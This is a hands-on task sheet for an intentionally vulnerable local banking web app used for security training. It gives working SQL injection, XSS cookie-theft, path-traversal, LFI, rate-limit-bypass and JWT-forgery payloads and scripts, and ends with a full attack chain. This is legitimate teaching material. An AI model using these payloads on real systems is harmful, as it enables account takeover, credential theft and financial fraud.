# 🏦 Bank of VULN — Task Sheet

> ⚠️ **Authorized lab only.** Everything here runs on your own machine
> (`localhost` / XAMPP). **Never deploy it anywhere real and never run these
> techniques against systems you don't own.**

Each task states a **Goal**, the **Page** it lives on, the **Steps** to do it,
and the **Result** you should see.

---

## 0 · Setup (do this first)

1. Start **Apache** and **MySQL** in the XAMPP control panel.
2. (Once) make the folder writable:
   ```bash
   chmod 777 /Applications/XAMPP/xamppfiles/htdocs/vunerability/bank-app
   ```
3. Open the dashboard (the app self-seeds on first request):
   ```
   http://localhost/vunerability/bank-app/index.php
   ```
4. Every task assumes:
   ```
   BASE = http://localhost/vunerability/bank-app
   ```

### Seed accounts

| id | username | email | password | role | balance | account # |
|----|----------|-------|----------|------|---------|-----------|
| 1 | admin | admin@bank.local | Admin@123 | **admin** | $999,999.99 | 1000000001 |
| 2 | alice | alice@bank.local | alice123 | user | $1,000.00 | 1000000002 |
| 3 | bob | bob@bank.local | bob123 | user | $500.00 | 1000000003 |
| 4 | mallory | mallory@bank.local | mallory123 | user | $25.00 | 1000000004 |

---

## PART 1 · Normal usage

### Task 1.1 — Open an account
- **Page:** `register.php`
- **Steps:** Fill in username, full name, email, password → **Create account**.
- **Result:** "Account created!"

### Task 1.2 — Log in
- **Page:** `login.php`
- **Steps:** Log in as alice (`alice@bank.local` / `alice123`).
- **Result:** alice's dashboard with her balance.

### Task 1.3 — Transfer money from A to B
- **Page:** `transfer.php`
- **Goal:** Move $100 from **alice** (A) to **bob** (B).
- **Steps:** As alice: `To account` = `1000000003`, `Amount` = `100` → **Transfer**.
- **Result:** alice $900, bob $600, entry in "Recent transactions".

### Task 1.4 — Claim the daily bonus
- **Page:** `bonus.php`
- **Steps:** Click **Claim $10**.
- **Result:** Balance +$10.

---

## PART 2 · Injection & authentication

### Task 2.1 — Bypass the login with SQL injection
- **Page:** `login.php`
- **Goal:** Log in as **admin** without the password.
- **Steps:** In the **Email** box enter (password = anything):
  ```
  ' OR '1'='1' #
  admin' #
  ```
- **Result:** Dashboard as **admin**.

### Task 2.2 — Dump the users table (UNION)
- **Page:** `login.php`
- **Goal:** Extract every email + password.
- **Steps:**
  ```
  ' ORDER BY 9 #
  ' UNION SELECT id,username,email,password,role,balance,account_number,8,9 FROM users #
  ```
- **Result:** Table credentials returned.

### Task 2.3 — Leak data (error-based SQLi)
- **Page:** `login.php`
- **Steps:** In the **Email** box:
  ```
  ' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users))) #
  ```
- **Result:** usernames:passwords in the error line.

### Task 2.4 — Confirm plaintext passwords
- **Page:** `view-account.php`
- **Steps:** Read the `password` field after Task 2.2/2.3.
- **Result:** Passwords readable as-is (`Admin@123`, `alice123`, …).

### Task 2.5 — Bypass the login rate limiter
- **Page:** `login.php`
- **Goal:** Keep guessing past the "3 attempts / 60s" lock.
- **Steps:**
  ```bash
  for i in 1 2 3; do
    curl -s -d "email=admin@bank.local&password=wrong&login=1" $BASE/login.php -o /dev/null
  done
  for i in $(seq 1 50); do
    curl -s -H "X-Forwarded-For: 10.0.0.$i" \
         -d "email=admin@bank.local&password=guess$i&login=1" \
         $BASE/login.php -o /dev/null
  done
  ```
- **Result:** No lockout across the rotated requests.

---

## PART 3 · Business logic & race conditions

### Task 3.1 — Transfer OUT of another account
- **Page:** `transfer.php`
- **Goal:** As **bob**, move money from **admin's** account.
- **Steps:**
  1. Log in as bob (`bob@bank.local` / `bob123`).
  2. **F12** → Elements → change the hidden field
     `name="from_account"` value to `1000000001` (admin).
  3. `To account` = `1000000004`, `Amount` = `500` → **Transfer**.
- **Result:** admin −$500, mallory +$500.
- **curl:**
  ```bash
  curl -s -b jar.txt -d "from_account=1000000001&to_account=1000000004&amount=500&transfer=1" $BASE/transfer.php
  ```

### Task 3.2 — Mint money with a negative amount
- **Page:** `transfer.php`
- **Goal:** Increase your own balance.
- **Steps:** As bob:
  ```bash
  curl -s -b jar.txt -d "from_account=1000000003&to_account=1000000002&amount=-1000&transfer=1" $BASE/transfer.php
  ```
- **Result:** bob +$1,000.

### Task 3.3 — Race the daily bonus
- **Page:** `bonus.php`
- **Goal:** Fire 10 concurrent $10 claims.
- **Steps:**
  ```bash
  curl -s -c jar.txt -d "email=bob@bank.local&password=bob123&login=1" $BASE/login.php -L -o /dev/null
  for i in $(seq 1 10); do
    curl -s -b jar.txt -d "claim=1" $BASE/bonus.php -o /dev/null &
  done; wait
  curl -s -b jar.txt $BASE/index.php | grep -o '\$[0-9,]*\.\?[0-9]*'
  ```
- **Result:** Total gain is less than $100.

### Task 3.4 — Double-spend a transfer
- **Page:** `transfer.php`
- **Goal:** Spend the same $500 twice at once.
- **Steps:** As bob (bal $500):
  ```bash
  curl -s -b jar.txt -d "from_account=1000000003&to_account=1000000004&amount=500&transfer=1" $BASE/transfer.php -o /dev/null &
  curl -s -b jar.txt -d "from_account=1000000003&to_account=1000000002&amount=500&transfer=1" $BASE/transfer.php -o /dev/null &
  wait
  ```
- **Result:** Both transfers succeed; bob loses $500 once.

---

## PART 4 · Broken access control

### Task 4.1 — Read any account + password
- **Page:** `view-account.php`
- **Steps:** Logged in, walk the id:
  ```
  BASE/view-account.php?id=1
  BASE/view-account.php?id=2
  BASE/view-account.php?id=3
  ```
- **Result:** Every row (incl. password) is readable.

### Task 4.2 — Reset another user's password
- **Page:** `profile.php`
- **Goal:** Take over **admin**.
- **Steps:** Visit `BASE/profile.php?id=1`, set **New password** → **Save**, then
  log in as `admin@bank.local` with it.
- **Result:** Logged in as admin.

### Task 4.3 — Escalate to admin via SQLi
- **Page:** `profile.php`
- **Steps:** Set the **Username** field to:
  ```
  x', role='admin
  ```
- **Result:** Your `role` becomes `admin` (verify in `view-account.php`).

### Task 4.4 — Become admin via the role cookie
- **Page:** `admin.php`
- **Steps:** Open `admin.php?admin=1`, then **F12** → Application → Cookies →
  set `role = admin` → reload.
- **Result:** Full customer table shown.

---

## PART 5 · Stored XSS & session hijacking

### Task 5.1 — Plant a stored XSS payload
- **Page:** `register.php`
- **Steps:** Register with username:
  ```
  <script>new Image().src="sniffer.php?c="+document.cookie</script>
  ```
- **Result:** Payload runs on `index.php`, `profile.php`, and `admin.php`.

### Task 5.2 — Steal a session cookie
- **Page:** `sniffer.php`
- **Steps:** After a victim renders your username, read:
  ```bash
  cat /Applications/XAMPP/xamppfiles/htdocs/vunerability/bank-app/stolen.txt
  ```
- **Result:** A captured `PHPSESSID` line. Paste it into another browser to
  hijack the session.

---

## PART 6 · File exposure

### Task 6.1 — Path traversal
- **Page:** `file.php`
- **Steps:**
  ```
  BASE/file.php?file=.env
  BASE/file.php?file=config.php.bak
  BASE/file.php?file=../database.php
  BASE/file.php?file=../../../../../../etc/passwd
  ```
- **Result:** File contents printed raw.

### Task 6.2 — Local File Inclusion
- **Page:** `file.php`
- **Steps:**
  ```
  BASE/file.php?page=php://filter/convert.base64-encode/resource=database.php
  BASE/file.php?page=../config.php.bak
  ```
  Decode base64: `echo '<output>' | base64 -d`
- **Result:** Included file rendered in the LFI box.

### Task 6.3 — Grab the leaked dev files
- **Page:** static web root
- **Steps:**
  ```
  BASE/.env
  BASE/config.php.bak
  BASE/backup.sql
  BASE/schema.sql
  ```
- **Result:** DB creds, `JWT_SECRET`, API keys, admin password.

---

## PART 7 · JWT / API

### Task 7.1 — Forge a token with `alg: none`
- **Page:** `api.php`
- **Steps:**
  ```bash
  python3 - <<'PY'
  import base64, json
  b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
  h = b64({"alg":"none","typ":"JWT"}); p = b64({"sub":"admin","role":"admin","iat":0})
  print(f"{h}.{p}.")
  PY
  curl -s -H "Authorization: Bearer <token>" $BASE/api.php
  ```
- **Result:** `"role":"admin"`.

### Task 7.2 — Forge a signed token with the leaked secret
- **Page:** `api.php`
- **Steps:**
  ```bash
  python3 - <<'PY'
  import base64, hashlib, hmac, json
  b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
  h = b64({"alg":"HS256","typ":"JWT"}); p = b64({"sub":"admin","role":"admin","iat":0})
  secret = "change_me_bank_super_secret_123"
  sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
  print(f"{h}.{p}.{sig}")
  PY
  ```
- **Result:** A valid signed admin token the API accepts.

---

## PART 8 · Full attack chain

1. **6.3** — Download `.env` → `JWT_SECRET` + admin password.
2. **2.1** — SQLi login as admin.
3. **7.1 / 7.2** — Forge a JWT.
4. **4.1** — Walk `view-account.php?id=1..N`.
5. **4.2** — Reset a victim's password.
6. **3.1** — Drain admin's money via the tampered `from_account`.
7. **3.2** — Pump your balance with negative transfers.
8. **5.1 / 5.2** — Plant XSS, steal the admin session.
9. **4.4** — Flip the `role` cookie and read the whole table.
10. **6.1 / 6.2** — Path-traverse and LFI the source.
11. **3.3 / 2.5** — Race the balance and brute-force the login.
